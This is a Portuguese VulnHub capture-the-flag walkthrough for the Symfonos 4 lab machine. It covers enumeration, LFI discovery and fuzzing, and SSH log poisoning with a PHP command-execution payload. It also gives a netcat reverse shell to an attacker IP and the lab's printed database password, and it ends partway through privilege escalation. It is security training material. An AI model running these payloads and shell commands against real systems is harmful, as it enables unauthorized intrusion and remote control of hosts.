---
title: "VulnHub - Symfonos 4"
tags: [Linux,Medium]
categories: VulnHub
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/inicial.png)

Link: <https://www.vulnhub.com/entry/symfonos-31,332/>

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.100/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Porta 22 -> Servidor SSH

> Porta 80 -> Servidor Web

## Enumeração da Porta 80 (Web)

Entramos no site pra ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/web.png)

Rodamos o gobuster nele

```bash
gobuster dir -u http://192.168.56.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/gobuster.png)

Tanto o **atlantis.php** quanto o **sea.php** nos 'redirecionam' pra mesma página de login

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/atlantis.png)

O diretorio **/gods** nos da o que parece uns arquivos de log

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/gods.png)

Verificamos do que se trata eles

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/logs.png)

### Descobrindo LFI

Aqui eu demorei um bom tempo pra pegar a ideia desse LFI... se tentarmos entrar no **sea.php** ele automaticamente vai redirecionar para o **atlantis.php**, até ai tudo bem, testamos jogar para o burp pra ver o que poderiamos fazer e nada de útil... O que deve ser feito? Quando vc loga com qualquer usuário, mesmo um que de errado nesse atlantis.php, ele vai gerar um cookie (PHPSSESSID), e com esse cookie ao entrarmos de novo no **sea.php** temos uma surpresa

Devemos selecionar um 'god'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/sea.png)

Ao selecionarmos, o parâmetro é **file=**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/sea1.png)

### BruteForce LFI

Testei todo tipo de arquivo, e não fui capaz de ler nenhum, então resolvi fazer um bruteforce nele

O que é interessante é lembrar de adicionar o ../../../../../../../ antes do FUZZ...

```bash
wfuzz -c --hw 39 -b 'PHPSESSID=2vg4c4t2jlgs9l9eqn23dbptpi' -w '/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt' -u 'http://192.168.56.108/sea.php?file=../../../../../../../FUZZ'

```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/wfuzz.png)

Aqui eu fiz com essa wordlist, mas tanto faz qual você vai usar, desde que seja pra LFI, se não der uma, testa a outra.

Achamos algo em **/var/log/auth**, vamos ver o que é isso

É o arquivo que loga todas as tentativas de login

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/wfuzz1.png)

# SSH Log Poison

[Referencia](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/)

Bom, vamos fazer RCE através de um LFI e do SSH log poison...

Primeiro devemos envenenar o log dele

```bash
ssh '<?php system($_GET['cmd']); ?>'@192.168.56.108
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/ssh.png)

Testamos agora e vemos que temos RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/ssh1.png)

## Reverse Shell

Agora, ficou fácil de pegarmos um shell reverso

```bash
cmd=nc -e /bin/bash 192.168.56.102 443
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/ssh2.png)

# WWW-Data -> Root

Assim que entramos na máquina, lemos o arquivo **atlantis.php** e encontramos as credenciais de acesso para o banco de dados

```
define('DB_USERNAME', 'root');        
define('DB_PASSWORD', 'yVzyRGw3cG2Uyt2r');
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/ssh3.png)

Então logamos nele e encontramos apenas um hash

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/sql.png)

Começamos a pesquisar por arquivos de interesse dentro do sistema... encontramos que a pasta /opt tem um data de modificação específica, que as outras pastas não tem

```bash
find / -regextype posix-extended -regex "/(sys|srv|proc|dev|usr|boot|var|etc|run|root)" -prune -o -type d -newermt 2019-08-18 ! -newermt 2019-08-19 -ls
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/find.png)

Parece ser algum script

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/find1.png)

Bom, parece estar executando algo...

## PSPY

Para descobrirmos os processos que estão sendo executados na máquina, usamos o [PSPY](https://github.com/DominicBreuker/pspy)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/pspy.png)

Passamos pra máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/pspy1.png)

Executamos e encontramos algo sendo executado na porta 8080

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/pspy2.png)

Com o comando **ps -aux | grep 8080** confirmamos isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos4/pspy3.png)










